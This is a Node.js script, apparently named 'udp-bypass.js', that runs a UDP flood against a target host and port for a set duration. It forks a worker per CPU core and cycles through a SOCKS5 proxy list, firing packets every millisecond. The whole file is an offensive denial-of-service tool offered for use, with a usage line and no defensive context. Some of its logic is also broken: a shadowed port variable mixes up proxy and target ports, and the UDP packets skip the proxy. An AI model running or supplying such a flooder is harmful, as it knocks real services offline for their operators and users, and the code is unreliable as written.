const net = require('net');
const dgram = require('dgram');
const cluster = require('cluster');
const fs = require('fs');
const SocksClient = require('socks').SocksClient;

process.setMaxListeners(0);
require('events').EventEmitter.defaultMaxListeners = 0;

if (process.argv.length < 5) {
    console.log('Usage: node udp-bypass.js <target> <port> <duration> <proxy_file>');
    process.exit(0);
}

const target = process.argv[2];
const port = parseInt(process.argv[3]);
const duration = parseInt(process.argv[4]);
const proxyFile = process.argv[5];

let PROXYLIST = [];
if (fs.existsSync(proxyFile)) {
    PROXYLIST = fs.readFileSync(proxyFile, 'utf-8').toString().split('\n').filter(a => a.trim() && a.includes(':'));
}

const payloads = [
    Buffer.from('q\0\0\0\0\0\0\0', 'binary'),
    Buffer.from('\x01\x00\x00\x00\x00\x00\x00\x00', 'binary'),
    Buffer.from('\x00\x01\x00\x00\x00\x00\x00\x00', 'binary'),
    Buffer.from('\x00\x00\x01\x00\x00\x00\x00\x00', 'binary'),
    Buffer.from('\x00\x00\x00\x01\x00\x00\x00\x00', 'binary'),
    Buffer.from('\x00\x00\x00\x00\x01\x00\x00\x00', 'binary')
];

const flood = async () => {
    if (PROXYLIST.length === 0) {
        console.log('No proxies loaded. Exiting...');
        process.exit(0);
    }

    setInterval(async () => {
        const proxy = PROXYLIST[Math.floor(Math.random() * PROXYLIST.length)];
        const [host, port] = proxy.split(':');

        try {
            const { socket } = await SocksClient.createConnection({
                proxy: {
                    host: host,
                    port: parseInt(port),
                    type: 5
                },
                command: 'connect',
                destination: {
                    host: target,
                    port: port
                }
            });

            const client = dgram.createSocket('udp4');
            
            for (let i = 0; i < 5; i++) {
                const payload = payloads[Math.floor(Math.random() * payloads.length)];
                client.send(payload, port, target, (error) => {
                    if (error) {
                        client.close();
                    }
                });
            }

            socket.on('error', () => {
                socket.destroy();
                client.close();
            });

        } catch (error) {
            // Skip failed proxy
        }
    }, 1);
};

if (cluster.isMaster) {
    const numCPUs = require('os').cpus().length;
    for (let i = 0; i < numCPUs; i++) {
        cluster.fork();
    }

    setTimeout(() => {
        process.exit(0);
    }, duration * 1000);
} else {
    flood();
} 